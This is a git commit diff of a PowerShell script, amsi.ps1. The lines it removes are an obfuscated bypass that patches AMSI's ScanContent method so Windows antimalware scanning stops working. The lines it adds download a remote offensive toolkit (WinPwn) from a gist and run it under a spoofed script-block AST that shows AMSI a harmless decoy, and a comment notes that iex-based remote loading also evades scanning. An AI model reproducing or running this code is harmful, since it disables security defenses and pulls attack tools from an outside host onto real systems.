d52ddc2ed6a448f0124ad80f6b7a6e306497faa3
Robiinn <Robiinn@users.noreply.github.com>
2025-08-14 13:43:59 +0200

    Update amsi.ps1

--- amsi.ps1
+++ amsi.ps1
@@ -1,6 +1,12 @@
-class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
-$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
-$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
-[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
+$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
+$ExecutedAst = [ScriptBlock]::Create("$c").Ast
+$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
+                                                                   $null,
+                                                                   $null,
+                                                                   $null,
+                                                                   $ExecutedAst.EndBlock.Copy(),
+                                                                   $null)
+$Sb = $Ast.GetScriptBlock()
+# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
+& $Sb
